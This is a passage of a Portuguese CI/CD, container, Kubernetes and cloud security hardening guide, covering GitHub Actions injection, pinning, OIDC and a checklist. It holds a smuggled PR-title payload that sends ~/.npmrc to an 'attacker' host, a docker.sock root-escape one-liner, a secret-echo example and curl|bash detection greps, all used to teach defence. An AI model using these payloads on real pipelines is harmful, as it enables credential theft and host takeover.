dado não confiável (parse, validação de tipo, truncamento — nunca `eval`, nunca `run: ${{ ... }}`),
(c) tem `permissions` mínimas, (d) `workflow_run` roda o workflow da branch **default**, então
alterar `pr-comment.yml` num PR não muda o que executa.

Se `pull_request_target` for realmente necessário, o mínimo é: `permissions: read-all` (ou menos),
nenhum checkout do PR, e — para PRs de fork — exigir aprovação via `environment` com reviewer.

### Script injection via `${{ github.event.* }}`

O bug mais comum de Actions. A expressão `${{ }}` é substituída **textualmente no script** antes de
o shell existir. Não é uma variável: é concatenação de string gerando código.

```yaml
# ❌ RCE. Título do PR: a"; curl https://attacker/$(cat $HOME/.npmrc | base64 -w0); echo "
- run: echo "Revisando PR: ${{ github.event.pull_request.title }}"
```

Com `on: pull_request` os segredos não estão lá, mas o `GITHUB_TOKEN` e o cache estão, e num
repositório privado o atacante já é insider. Com `on: issue_comment` ou `pull_request_target`, é
comprometimento total.

```yaml
# ✅ o valor vira variável de ambiente; o shell nunca reinterpreta o conteúdo
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Revisando PR: $PR_TITLE"
```

Duas ressalvas: **use aspas** (`"$PR_TITLE"`, não `$PR_TITLE`, senão há word splitting e glob), e
`env:` não salva você se depois fizer `eval "$PR_TITLE"`, `bash -c "$PR_TITLE"` ou
`jq ".$PR_TITLE"`.

Campos controlados pelo atacante que aparecem em `run:` na vida real:

```
github.event.issue.title            github.event.issue.body
github.event.pull_request.title     github.event.pull_request.body
github.event.comment.body           github.event.review.body
github.event.review_comment.body    github.event.discussion.title / .body
github.event.commits.*.message      github.event.head_commit.message
github.event.head_commit.author.name / .email
github.event.commits.*.author.name / .email
github.event.pull_request.head.ref  github.event.pull_request.head.label
github.event.pull_request.head.repo.description / .homepage / .default_branch
github.head_ref
github.event.workflow_run.head_branch
github.event.workflow_run.head_commit.message / .author.name / .author.email
github.event.pages.*.page_name
```

`github.head_ref` merece nota: nome de branch aceita caracteres como `;` e `` ` ``, e um PR de fork
carrega o nome de branch escolhido pelo atacante.

Grep de revisão:

```bash
grep -rnE '\$\{\{\s*github\.(event|head_ref)' .github/workflows/ \
  | grep -vE 'env:|with:'
```

Ferramentas: `zizmor` (o linter de Actions mais completo hoje), `actionlint` (pega template
injection e erros de sintaxe), `poutine`. Comandos em `references/ferramentas.md`.

### Pin de action por SHA

```yaml
# ❌ tag é mutável — quem controla o repositório da action pode mover v4 para outro commit
- uses: tj-actions/changed-files@v44

# ✅ imutável
- uses: tj-actions/changed-files@2f7c5bfce28377bc069a65ba478de0a74aa0ca32 # v44.5.2
```

Isso deixou de ser teórico em **março de 2025**, quando `tj-actions/changed-files` foi comprometida
(CVE-2025-30066): o atacante **reescreveu as tags existentes** para apontar para um commit que
dumpava a memória do runner e imprimia os segredos no log — em repositórios públicos, os logs são
públicos, então os segredos vazaram para qualquer um. Quem tinha pin de SHA não foi afetado.
`reviewdog/action-setup` foi comprometida **três dias antes** (11/03/2025) e é o vetor inicial
suspeito do comprometimento do `tj-actions` — a ordem importa, porque mostra o ataque se
propagando de uma action para outra.

Notas:
- Pinne **tudo**, inclusive `actions/checkout` e `actions/setup-node`. O comentário `# v4.2.2` ao
  lado do SHA é o que mantém isso legível.
- Dependabot atualiza SHAs pinados normalmente (`package-ecosystem: github-actions`).
- O GitHub tem **immutable releases**: uma release publicada não pode ter sua tag movida. Ajuda,
  mas só para quem opta e só para releases — pin de SHA continua sendo a garantia.
- Configure em Settings → Actions a política de "Allow select actions": só `actions/*`,
  `github/*` e uma allowlist explícita.

### `GITHUB_TOKEN` e `permissions`

O default depende da configuração da org/repositório e, em repositórios antigos, ainda é
**read-write em tudo** — o que significa que qualquer step comprometido pode fazer push na `main`,
criar release, deletar branch, e (com `packages: write`) publicar imagem.

```yaml
# no topo do workflow: nega tudo por padrão
permissions: {}

jobs:
  test:
    permissions:
      contents: read           # eleva só o necessário, por job
  release:
    permissions:
      contents: write          # criar tag/release
      id-token: write          # OIDC
      packages: write
```

`permissions: {}` (objeto vazio) remove todos os escopos; `permissions: read-all` dá leitura em
tudo. Prefira o vazio no topo e a elevação por job.

**`actions/checkout` com `persist-credentials`**: o default é `true`, e ele grava o token como
`http.extraheader` em `.git/config` dentro do workspace. Qualquer step posterior — inclusive um
`postinstall` de dependência — lê aquele arquivo. Use `persist-credentials: false` sempre que o job
não precisar fazer push.

### Self-hosted runner

A regra do GitHub é categórica: *"Self-hosted runners should almost never be used for public
repositories"*. O motivo: qualquer pessoa abre um PR, e o workflow de PR executa código dela na sua
máquina.

O problema além de "executa código": runners self-hosted são **persistentes por padrão**. Job A
deixa no disco `~/.docker/config.json`, `~/.aws/credentials`, `~/.npmrc`, o cache do build, e um
`~/.bashrc` alterado. Job B — de outro repositório ou de outro PR — lê tudo. É envenenamento entre
jobs, e é como se pivota de "PR num repo interno qualquer" para "credencial de produção".

Mitigações, em ordem: (1) não usar self-hosted em repositório público; (2) runners **efêmeros/JIT**
(`--ephemeral`, ou Actions Runner Controller no Kubernetes com pod por job); (3) **runner groups**
restringindo quais repositórios podem usar cada grupo; (4) exigir aprovação para workflows de
first-time contributors (Settings → Actions → "Require approval for all outside collaborators").

### Cache envenenado

O cache do Actions não é verificado por integridade; quem escreve numa branch controla o cache
daquela branch. As regras de escopo: um job em `feature-x` **lê** caches de `feature-x` e da branch
default; **escreve** apenas no escopo de `feature-x`. Isso impede que um PR envenene diretamente o
cache da `main`.

O caminho de escalada é o gatilho privilegiado: um `workflow_run` ou `pull_request_target` que
restaura um cache cuja chave foi calculada a partir de dado do PR — ou que roda no contexto da base
mas com `restore-keys` genérica o bastante para casar com uma entrada gravada pelo job não
confiável. Regra: **job privilegiado não usa cache compartilhado com job não confiável.** Inclua o
gatilho e o escopo de confiança na chave (`key: build-trusted-${{ hashFiles('**/package-lock.json') }}`)
e nunca use `restore-keys` que caia em escopo de PR.

### Artefato com segredo

`actions/upload-artifact` sobe o que você mandar, e em repositório público **qualquer pessoa com a
URL do run baixa** durante o período de retenção (90 dias por padrão). Vazamentos recorrentes:

- `path: .` → sobe `.git/` inteiro, com `config` contendo o token do `checkout` (se
  `persist-credentials: true`), e todo o histórico.
- `path: ./dist` quando o build copia `.env` para `dist/`.
- Coverage/relatório de teste com dump de env em caso de falha.
- `node_modules/.cache` com credencial de registro privado.

Regras: liste paths explícitos, nunca `.`; adicione `!**/.env`, `!**/.git/**` como exclusões;
reduza `retention-days`; e trate artefato de job não confiável como entrada hostil ao consumir
(inclusive contra zip-slip ao extrair).

### OIDC para cloud — o erro de `sub`

Trocar `AWS_ACCESS_KEY_ID` estático por OIDC é a melhoria de maior retorno em CI. Mas a trust policy
mal escrita transforma "sem chave de longa duração" em "qualquer repositório do GitHub assume meu
role".

```json
// ❌ CATASTRÓFICO — sem condição de sub, QUALQUER workflow de QUALQUER conta do GitHub assume
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" }
  }
}
```

```json
// ⚠️ fraco — qualquer branch, qualquer PR, qualquer environment do repo
"StringLike": { "token.actions.githubusercontent.com:sub": "repo:octo-org/octo-repo:*" }
```

```json
// ✅ restrito a um environment (o mais forte, porque environment aceita reviewer obrigatório)
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:octo-org/octo-repo:environment:production"
    }
  }
}
```

Pontos finos:
- `repo:org/repo:ref:refs/heads/main` restringe por branch, mas **branch pode ser criada por
  qualquer um com write**. `environment:production` é melhor porque o environment carrega required
  reviewers e branch policy.
- Nunca use `StringLike` com `*` no meio do org/repo (`repo:octo-org/*`), e jamais omita o `aud`.
- GitHub suporta **IDs imutáveis** no `sub` (`repo:octo-org@123456/octo-repo@456789:...`), que
  sobrevivem a renomeação de org/repo e evitam o ataque de "org deletada, atacante registra o nome".
- Habilite o **role session name / tags** e audite `sts:AssumeRoleWithWebIdentity` no CloudTrail.
- Equivalente no GCP: Workload Identity Federation com `attribute.repository` na condição — o mesmo
  erro de omitir a condição existe lá.

### `environment`, branch protection, CODEOWNERS

- **`environment:`** num job é o único lugar onde você consegue *approval gate* e segredos escopados:
  segredo de `production` não é legível por job que não declara `environment: production`. Configure
  required reviewers e "deployment branches" (só `main` pode deployar em `production`).
- **Branch protection / rulesets** na `main`: require PR, require review (≥1, ≥2 para repositório
  sensível), **dismiss stale approvals on push**, require status checks (o job de segurança entre
  eles), **require signed commits**, block force push, e — crítico — **incluir administradores**.
  Sem "include administrators", a proteção é decorativa.
- **`CODEOWNERS`**: aponte os arquivos de infraestrutura para um time de segurança/plataforma.
  ```
  /.github/workflows/   @org/plataforma @org/seguranca
  /Dockerfile           @org/plataforma
  /infra/**             @org/plataforma
  **/package-lock.json  @org/seguranca
  ```
  Combine com "Require review from Code Owners" no ruleset — senão `CODEOWNERS` é só sugestão de
  reviewer. O arquivo `CODEOWNERS` em si deve estar coberto por ele mesmo.
- Desabilite **"Allow GitHub Actions to create and approve pull requests"** (Settings → Actions).
  Habilitado, um workflow com `pull-requests: write` aprova o próprio PR e contorna o required
  review.

## GitLab CI, Jenkins e Azure Pipelines

**GitLab CI**
- **Protected variables** só são expostas em refs protegidos. O bug clássico: variável com segredo
  de produção deixada **desprotegida** — qualquer dev cria uma branch com um `.gitlab-ci.yml` que
  faz `echo $PROD_KEY | base64` e lê. Marque protected + masked.
- `CI_JOB_TOKEN`: por padrão histórico, podia acessar outros projetos. Configure o **allowlist de
  job token** por projeto (Settings → CI/CD → Job token permissions) restringindo quem pode usar o
  token daquele projeto.
- `include:` remoto (`include: {remote: 'https://.../ci.yml'}`) é uma action sem pin: o conteúdo pode
  mudar a qualquer momento. Prefira `include: {project:, ref: <sha>, file:}`.
- Runner Docker executor com `privileged = true` no `config.toml` é root no host — necessário para
  DinD, e a razão para usar Kaniko/BuildKit rootless em vez de DinD.
- Injeção equivalente: `$CI_COMMIT_MESSAGE`, `$CI_COMMIT_BRANCH`, `$CI_MERGE_REQUEST_TITLE` dentro
  de `script:`.
- Fork de projeto público: por padrão pipelines de MR de fork rodam com as permissões do fork; a
  opção "Run untrusted pipelines in a separate runner" existe por um motivo.

**Jenkins**
- O maior risco é arquitetural: o **controller** tem `credentials.xml` cifrado com
  `secrets/master.key` + `hudson.util.Secret` no mesmo disco. Qualquer job rodando **no controller**
  (`agent any` sem restrição, ou `agent none` com steps no master) lê os dois e decifra todas as
  credenciais. Nunca execute build no controller: `Manage Jenkins → Nodes → Built-In Node →
  executors: 0`.
- Groovy sandbox / Script Security: `@NonCPS` e chamadas fora do sandbox exigem aprovação de admin.
  A fila "In-process Script Approval" aprovada em massa é um antipadrão comum.
- Shared libraries (`@Library('x@master')`) sem pin de commit = mesma classe de problema de tag
  mutável. Use `@Library('x@<sha>')`.
- `withCredentials` mascara o segredo no log, mas mascaramento é substituição de string: `base64` do
  segredo, ou imprimir caractere a caractere, contorna. Não confie em mascaramento como controle.
- Mantenha o Jenkins e plugins atualizados; a maior parte dos CVEs críticos do ecossistema está em
  plugin, não no core.

**Azure Pipelines**
- Sintaxe de macro `$(var)` é **substituição textual antes do shell**, exatamente como `${{ }}` do
  Actions. `$(Build.SourceBranchName)` ou uma variável derivada do título do PR dentro de um
  `script:` é injeção. Use `env:` mapeando para variável de processo e cite com aspas.
- `${{ parameters.x }}` é expansão em tempo de compilação do template — permite injetar YAML, não só
  shell. Restrinja parâmetros com `values:` enumerados.
- **"Make secrets available to builds of forks"** deve ficar desligado (é o default) para repositório
  público.
- **"Limit job authorization scope to current project"** deve estar ligado; sem isso, o
  `System.AccessToken` de um pipeline alcança outros projetos da organização.
- Service connections: use **Workload Identity Federation** (OIDC) em vez de service principal com
  secret, e marque a connection como não-compartilhada entre projetos. Adicione "approvals and
  checks" nas connections de produção.

## OWASP Top 10 CI/CD Security Risks

Lista separada do Top 10 de aplicação, e o melhor mapa mental para revisar um pipeline
([projeto OWASP](https://owasp.org/www-project-top-10-ci-cd-security-risks/)):

| Código | Risco | Como aparece na prática |
|---|---|---|
| **CICD-SEC-1** | Insufficient Flow Control Mechanisms | Push direto na `main`; deploy sem review; merge automático; artefato indo para produção sem gate |
| **CICD-SEC-2** | Inadequate Identity and Access Management | Conta de serviço compartilhada, ex-funcionário com acesso ao CI, admin do SCM sem 2FA |
| **CICD-SEC-3** | Dependency Chain Abuse | Dependency confusion, typosquatting, `postinstall` malicioso — a seção de dependências acima |
| **CICD-SEC-4** | **Poisoned Pipeline Execution (PPE)** | O `pull_request_target` com checkout do PR. Variantes: **D-PPE** (o atacante altera o próprio arquivo de CI), **I-PPE** (altera um arquivo que o CI executa: `Makefile`, `jest.config.js`, script de `package.json`), **Public-PPE** (via PR de fork) |
| **CICD-SEC-5** | Insufficient PBAC (Pipeline-Based Access Controls) | Um job tem acesso a todos os segredos e a toda a rede; falta de segmentação entre build e deploy |
| **CICD-SEC-6** | Insufficient Credential Hygiene | Chave de longa duração, segredo em variável não protegida, sem rotação, segredo no log |
| **CICD-SEC-7** | Insecure System Configuration | Runner desatualizado, Jenkins sem hardening, permissões default do `GITHUB_TOKEN` |
| **CICD-SEC-8** | Ungoverned Usage of 3rd Party Services | Action de terceiro sem pin, integração OAuth com acesso amplo ao SCM, app de marketplace |
| **CICD-SEC-9** | Improper Artifact Integrity Validation | `curl \| bash` sem checksum (Codecov), imagem por tag mutável, ausência de verificação de assinatura no deploy |
| **CICD-SEC-10** | Insufficient Logging and Visibility | Ninguém sabe quem alterou o workflow, quem rodou o deploy, nem quando um segredo foi lido |

## Registro e artefato

- **Tag é mutável em praticamente todo registro.** `app:1.2.3` hoje pode não ser `app:1.2.3` amanhã.
  Em manifests e em `docker run`, referencie por **digest**: `ghcr.io/org/app@sha256:...`. Ative
  **tag immutability** onde existir (ECR: `imageTagMutability = IMMUTABLE`; GHCR e Docker Hub têm
  equivalentes por plano).
- **`latest`** quebra três coisas de uma vez: você não sabe o que está em produção, não consegue
  fazer rollback determinístico, e `imagePullPolicy: Always` faz cada restart de pod puxar
  potencialmente um binário diferente do que passou nos testes. Aceitável só em dev local.
- **Registro privado / proxy pull-through** (Artifactory, Nexus, ECR pull-through cache): dá cache,
  disponibilidade e — o que importa aqui — um ponto único onde aplicar política e ter inventário.
  Configure para **não** cair no público em caso de miss de pacote interno (é o mesmo problema de
  dependency confusion).
- **Retenção**: mantenha releases; expire builds de PR/branch em dias. Imagem antiga esquecida com
  CVE crítica que alguém redeploya é um cenário real.
- **Assinatura + admission control** é o que fecha o ciclo. Assinar sem verificar não protege nada:

```yaml
# Kyverno — só admite imagem assinada pelo workflow de release do repositório
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  rules:
    - name: verify-ghcr
      match:
        any:
          - resources: { kinds: [Pod] }
      verifyImages:
        - imageReferences: ["ghcr.io/minha-org/*"]
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/minha-org/*/.github/workflows/release.yml@refs/heads/main"
                    issuer: "https://token.actions.githubusercontent.com"
                    rekor: { url: https://rekor.sigstore.dev }
```

  Alternativa: **Sigstore policy-controller**. O erro a procurar é `subject: "*"` ou ausência de
  `issuer` — igual ao `cosign verify` sem identidade.

## Container e runtime

Só o recorte de segurança.

| Controle | Como | Por quê |
|---|---|---|
| Imagem base mínima | `gcr.io/distroless/nodejs24-debian12` ou `node:24-alpine` | Distroless não tem shell, `curl`, `wget` nem gerenciador de pacotes: reduz drasticamente o pós-exploração e o número de CVEs herdadas. Trade-off: debugar exige a variante `:debug` (busybox) ou `kubectl debug` com ephemeral container. Alpine usa musl — atenção a diferenças de resolução DNS e a binários nativos que só têm build glibc |
| Usuário não-root | `USER 10001` (**numérico**) | O k8s `runAsNonRoot: true` não resolve nome de usuário para UID: com `USER node` e sem `runAsUser`, o kubelet rejeita ou não consegue validar. Use UID numérico |
| Filesystem read-only | `docker run --read-only --tmpfs /tmp` / `readOnlyRootFilesystem: true` | Impede o atacante de escrever webshell, dropper ou persistência |
| Capabilities | `--cap-drop=ALL` (`--cap-add=NET_BIND_SERVICE` só se realmente ouvir em <1024) | O default do Docker já concede ~14 capabilities desnecessárias, incluindo `CAP_CHOWN`, `CAP_SETUID`, `CAP_MKNOD` |
| Sem escalada | `--security-opt=no-new-privileges` / `allowPrivilegeEscalation: false` | Neutraliza binários setuid dentro da imagem |
| seccomp | Default do Docker já bloqueia ~44 syscalls. Em k8s: `seccompProfile.type: RuntimeDefault` (**não é o default**) | Sem isso, o pod tem a syscall table inteira. `seccomp=unconfined` é sempre um achado |
| AppArmor/SELinux | `--security-opt apparmor=docker-default` | Confinamento adicional de acesso a arquivo/rede |

**O que é achado grave, sempre:**

- **`-v /var/run/docker.sock:/var/run/docker.sock`** — é root no host, em um comando:
  `docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine chroot /host`. Não
  existe "montei read-only, então tudo bem": a API do Docker permite criar containers privilegiados
  de qualquer forma. Aparece em agentes de CI, em Portainer, em Traefik e em "watchtower".
- **`--privileged`** — desliga praticamente tudo: capabilities completas, acesso a `/dev`, sem
  seccomp/AppArmor.
- **`--pid=host`, `--net=host`, `-v /:/host`** — quebra de isolamento direta.

**Segredo em camada.** `ARG NPM_TOKEN` + `RUN echo "//registry:_authToken=$NPM_TOKEN" > .npmrc`
persiste no histórico da imagem para sempre — `docker history --no-trunc` e `dive` extraem, mesmo
que um `RUN rm .npmrc` posterior exista (camadas são aditivas; remover não apaga). Multi-stage ajuda
(o segredo fica no stage de build descartado), mas a solução correta é o BuildKit secret mount, que
nunca toca em camada:

```dockerfile
# syntax=docker/dockerfile:1
FROM node:24-bookworm-slim AS build
WORKDIR /app
COPY package*.json ./
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci --ignore-scripts
COPY . .
RUN npm run build

FROM gcr.io/distroless/nodejs24-debian12
WORKDIR /app
COPY --from=build /app/dist ./dist
COPY --from=build /app/node_modules ./node_modules
USER 10001
CMD ["dist/server.js"]
```
```bash
docker build --secret id=npmrc,src=$HOME/.npmrc .
```

**`.dockerignore`.** Sem ele, `COPY . .` leva `.git/` inteiro para dentro da imagem — e `.git`
contém **todo o histórico**, incluindo o `.env` que alguém commitou e removeu três commits depois.
Também leva `.env`, `node_modules` local (com binários da arquitetura errada), `*.pem`, `.aws/`,
`terraform.tfstate`.

```
.git
.github
node_modules
.env
.env.*
*.pem
*.key
.terraform
terraform.tfstate*
coverage
Dockerfile
.dockerignore
```

**Escaneamento de imagem e por que a maioria dos CVEs não é acionável.** Um `node:24-bookworm-slim`
recém-publicado costuma reportar dezenas de CVEs em `libc`, `perl-base`, `zlib`, `libgcrypt`. A
maior parte:

- está em pacote que o seu container **nunca executa** (você roda um binário Node e nada mais);
- exige atacante **local** já dentro do container;
- não tem fix disponível no repositório da distro (`--ignore-unfixed` no Trivy remove esse ruído);
- é `will_not_fix` marcado pelo próprio vendor.

Por isso "zero CVEs" é uma meta ruim: ela empurra o time para suprimir alertas em massa. Metas boas:
(1) nenhuma CVE do **KEV**; (2) nenhuma CVE **com fix disponível** acima de high na camada da
aplicação; (3) imagem base reconstruída semanalmente (a maioria das CVEs de base some com um
`docker build --pull`). Use **VEX** para declarar formalmente "não afetado, componente não
executado" em vez de suprimir sem registro.

## Kubernetes

- **Pod Security Standards.** Três perfis: `privileged` (sem restrição), `baseline` (bloqueia
  escalada conhecida: sem host namespaces, sem `privileged`, sem `hostPath`, sem seccomp
  unconfined) e `restricted` (hardening completo). Aplique por label de namespace:

  ```yaml
  apiVersion: v1
  kind: Namespace
  metadata:
    name: app-prod
    labels:
      pod-security.kubernetes.io/enforce: restricted
      pod-security.kubernetes.io/enforce-version: latest
      pod-security.kubernetes.io/warn: restricted
      pod-security.kubernetes.io/audit: restricted
  ```

  O `restricted` exige `runAsNonRoot: true`, `allowPrivilegeEscalation: false`,
  `capabilities.drop: ["ALL"]`, `seccompProfile.type: RuntimeDefault` ou `Localhost`, e restringe
  volumes a `configMap`, `csi`, `downwardAPI`, `emptyDir`, `ephemeral`, `persistentVolumeClaim`,
  `projected`, `secret`. Rode primeiro em `warn`/`audit`, corrija, depois `enforce`.

- **NetworkPolicy default-deny.** Sem NetworkPolicy, todo pod fala com todo pod — um pod
  comprometido varre o cluster inteiro. Comece com deny-all de ingress **e egress** por namespace e
  abra o necessário. Egress importa mais do que parece: é o que impede exfiltração e impede o pod de
  alcançar o **IMDS do nó** (`169.254.169.254`), o caminho clássico SSRF → credencial da cloud (veja
  `references/ssrf-e-camada-http.md`). No EKS/GKE, force também IMDSv2 com
  `HttpPutResponseHopLimit = 1`.

- **RBAC.** Os verbos que valem privilégio de cluster mesmo sem parecer:
  `create pods` num namespace com ServiceAccount privilegiada (crie um pod que monta o token dela);
  `get/list secrets` (todos os segredos daquele escopo); `create pods/exec`; `escalate` e `bind`
  (permitem conceder a si mesmo mais do que se tem); `impersonate`; `patch nodes`. Procure
  `ClusterRoleBinding` para `cluster-admin` e `verbs: ["*"]` com `resources: ["*"]`.

- **Secret no etcd é base64, não criptografia.** Sem `EncryptionConfiguration` com provider KMS, um
  backup de etcd ou acesso ao disco do control plane entrega todos os segredos em claro. Nos
  managed (EKS/GKE/AKS), habilite envelope encryption com KMS. Prefira External Secrets Operator +
  Secrets Manager/Vault, e considere CSI Secret Store para nunca materializar o Secret como objeto
  do k8s.

- **`automountServiceAccountToken: false`** em toda workload que não fala com a API do k8s (a
  imensa maioria). Sem isso, o token está em
  `/var/run/secrets/kubernetes.io/serviceaccount/token`, e um SSRF ou path traversal vira acesso à
  API. Configure no ServiceAccount **e** no Pod.

- **`hostPath` / `privileged` / `hostNetwork` / `hostPID`.** `hostPath` montando `/`, `/var/run/`,
  `/etc` ou `/proc` é escape de container. `hostNetwork` dá acesso ao kubelet (10250) e ao metadata
  do nó. Bloqueio via PSS `restricted`; exceções só via namespace dedicado.

- **Admission control** é onde tudo acima vira obrigatório: Kyverno ou Gatekeeper (OPA) para exigir
  imagem por digest, assinatura verificada, limites de recurso, `securityContext` mínimo e labels de
  ownership. Sem admission, a política existe no wiki e não no cluster.

## IaC e cloud

Os erros de IaC que aparecem em breach report de verdade — não a lista completa do `tfsec`:

**Storage público.** Bucket S3/GCS aberto continua sendo a causa nº 1 de vazamento em massa. Desde
abril de 2023 a AWS liga **Block Public Access** e desabilita ACLs (`BucketOwnerEnforced`) por
padrão em buckets novos, o que ajudou muito — mas buckets antigos e overrides explícitos continuam
por aí. Aplique BPA **no nível da conta** (`aws_s3_account_public_access_block`), não só por bucket,
e não confie em "ninguém sabe a URL".

**Security group `0.0.0.0/0`.** Nunca em 22 (SSH), 3389 (RDP), 5432/3306 (banco), 6379 (Redis),
27017 (Mongo), 9200 (Elasticsearch), 2375 (Docker API). Use SSM Session Manager em vez de SSH
aberto. Egress `0.0.0.0/0` é aceitável na maioria dos casos, mas é o que permite exfiltração — em
ambiente sensível, restrinja com VPC endpoints.

**IAM com `*` e escalada por `iam:PassRole`.** `Action: "*"` / `Resource: "*"` é o achado óbvio. O
não-óbvio, e o que realmente é explorado: um principal com `iam:PassRole` combinado com
`ec2:RunInstances`, `lambda:CreateFunction` + `lambda:InvokeFunction`, `ecs:RunTask`,
`glue:CreateDevEndpoint` ou `cloudformation:CreateStack` **é admin efetivo** — ele cria um recurso,
passa um role mais privilegiado para ele, e executa código nesse role. Restrinja `iam:PassRole` por
`Resource` (o ARN exato do role) e por `iam:PassedToService`:

```hcl
statement {
  actions   = ["iam:PassRole"]
  resources = [aws_iam_role.task_execution.arn]
  condition {
    test     = "StringEquals"
    variable = "iam:PassedToService"
    values   = ["ecs-tasks.amazonaws.com"]
  }
}
```

**Chave de longa duração.** `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY` em segredo de CI é o padrão
que o OIDC substitui. Se ainda existir: rotação automática, `Condition` de IP/VPC, e alarme no
CloudTrail para uso fora do horário/origem esperada.

**Segredo em `terraform.tfvars` commitado.** Grep clássico. Mas o problema maior está abaixo.

**O estado do Terraform contém segredo em claro.** Isto é subestimado com frequência. A HashiCorp é
explícita: *"Terraform stores your state in a plaintext file, which includes any secret value you
defined in your configuration"*. Consequências:

- `sensitive = true` **só mascara a saída do CLI**. O valor está em claro no state. `terraform show
  -json` devolve tudo.
- Recursos que geram segredo (`random_password`, `aws_iam_access_key`, `aws_db_instance.password`,
  chave privada de `tls_private_key`) gravam o valor no state.
- Um data source lendo do Secrets Manager coloca o segredo no state.
- Portanto: **quem lê o state lê seus segredos**. `terraform.tfstate` local no repositório é
  vazamento imediato; bucket de state sem BPA é vazamento; permissão de leitura no bucket de state
  concedida a "todo o time de dev" é escalada de privilégio.

  Mitigação: backend remoto com **encrypt at rest** (`encrypt = true` no backend S3 + KMS CMK),
  bucket dedicado com BPA, versionamento e política restrita, state locking, e — em vez de gerar
  segredo no Terraform — criar o segredo fora e referenciar por ARN. O OpenTofu tem criptografia de
  state nativa (`encryption` block), o que é uma razão real para considerá-lo.

**Logging desativado.** CloudTrail em todas as regiões com data events para S3/Lambda onde importa,
VPC Flow Logs, GuardDuty ligado, e logs indo para uma **conta separada** com retenção — se o
atacante consegue apagar seus logs, você não tem logs. Correlato do
[A09:2025 – Security Logging & Alerting Failures](https://owasp.org/Top10/2025/).

**Responsabilidade compartilhada, em uma frase por camada:** o provedor responde pela segurança
*da* nuvem (hardware, hipervisor, plano de controle do serviço gerenciado); você responde pela
segurança *na* nuvem (IAM, configuração de rede, criptografia dos seus dados, patch do que você
roda). Em IaaS você patcheia o SO; em serviço gerenciado (RDS, Lambda, S3) você não patcheia, mas
**toda a configuração de acesso continua sua** — e é aí que ocorrem praticamente todos os
incidentes de cloud.

## Checklist: endurecer o pipeline deste repositório

Em ordem de retorno por esforço. Faça de cima para baixo e pare quando o orçamento acabar.

**Nível 1 — uma hora, retorno enorme**

1. `permissions: {}` no topo de todo workflow, elevando por job só o necessário.
2. Pinar **todas** as actions de terceiros por SHA completo (`# vX.Y.Z` no comentário).
3. Trocar todo `${{ github.event.* }}` dentro de `run:` por `env:` + `"$VAR"`.
4. `npm ci` (não `npm install`) em CI; lockfile commitado e presente no diff da revisão.
5. Auditar `pull_request_target`, `workflow_run` e `issue_comment`: nenhum faz checkout ou executa
   código do PR.
6. Ligar branch protection na `main` **com "include administrators"**: PR obrigatório, 1+ review,
   dismiss stale approvals, status checks obrigatórios.
7. Desligar "Allow GitHub Actions to create and approve pull requests".
8. Adicionar `.dockerignore` com `.git`, `.env`, `*.pem`.

**Nível 2 — um dia**

9. Trocar credencial estática de cloud por **OIDC**, com `sub` restrito a
   `repo:org/repo:environment:production` (não `*`).
10. `ignore-scripts=true` / `enableScripts: false` / `onlyBuiltDependencies` com allowlist.
11. Cooldown de versão: `minimumReleaseAge: 1440` (pnpm) ou `npmMinimalAgeGate` (Yarn); Renovate
    com `minimumReleaseAge`.
12. `environment: production` com required reviewers nos jobs de deploy; segredos movidos para o
    escopo do environment.
13. `CODEOWNERS` cobrindo `.github/workflows/`, `Dockerfile`, `infra/**`, lockfiles + "require
    review from code owners".
14. `persist-credentials: false` em todo `checkout` que não faz push.
15. Rodar `zizmor` e `actionlint` em CI; `gitleaks`/`trufflehog` no histórico.
16. Dockerfile: usuário não-root numérico, multi-stage, BuildKit secret mount, base pinada por
    digest.

**Nível 3 — uma semana**

17. `npm publish --provenance` ou **trusted publishing** (elimina o token npm).
18. `actions/attest-build-provenance` + `cosign verify` com `--certificate-identity` no deploy.
19. SBOM (CycloneDX) gerado da imagem final e ingerido em Dependency-Track.
20. Imagem referenciada por **digest** em produção; tag immutability no registro.
21. Admission control (Kyverno) exigindo assinatura verificada e bloqueando `privileged`/`hostPath`.
22. PSS `restricted` nos namespaces de aplicação (warn → audit → enforce).
23. NetworkPolicy default-deny (ingress **e** egress) + bloqueio do IMDS.
24. Runners self-hosted efêmeros; nenhum runner self-hosted em repositório público.
25. State do Terraform em backend cifrado com KMS, bucket dedicado, acesso restrito e auditado.

## Sinais em revisão

**`.github/workflows/*.yml`**

```bash
# gatilhos privilegiados
grep -rn 'pull_request_target\|workflow_run\|issue_comment\|workflow_dispatch' .github/workflows/

# checkout de código não confiável em contexto privilegiado — o padrão de RCE
grep -rn -A6 'pull_request_target' .github/workflows/ | grep -n 'head.sha\|head.ref\|head_sha'

# injeção de template
grep -rnE '\$\{\{\s*github\.(event|head_ref)' .github/workflows/

# actions sem pin de SHA (tag ou branch)
grep -rnE 'uses:\s*[^ ]+@(v?[0-9.]+|main|master)\s*$' .github/workflows/

# permissões
grep -rL 'permissions:' .github/workflows/*.yml     # workflows sem permissions declarado
grep -rn 'permissions:\s*write-all' .github/workflows/

# segredo passando por lugar errado
grep -rn 'secrets\.' .github/workflows/ | grep -i 'run:\|echo\|curl'

# artefato amplo demais
grep -rn -A3 'upload-artifact' .github/workflows/ | grep -E "path:\s*\.?\s*$|path:\s*\./?$"

# curl | bash (lição do Codecov)
grep -rnE 'curl[^|]*\|\s*(ba)?sh|wget[^|]*\|\s*(ba)?sh' .github/workflows/
```

**`Dockerfile`**

```bash
grep -nE '^(FROM .*:latest|FROM [^@]*$)' Dockerfile          # base sem digest
grep -nE 'ARG .*(TOKEN|SECRET|KEY|PASSWORD)' Dockerfile       # segredo vira camada
grep -nE '^COPY \. ' Dockerfile                               # sem .dockerignore = .git dentro
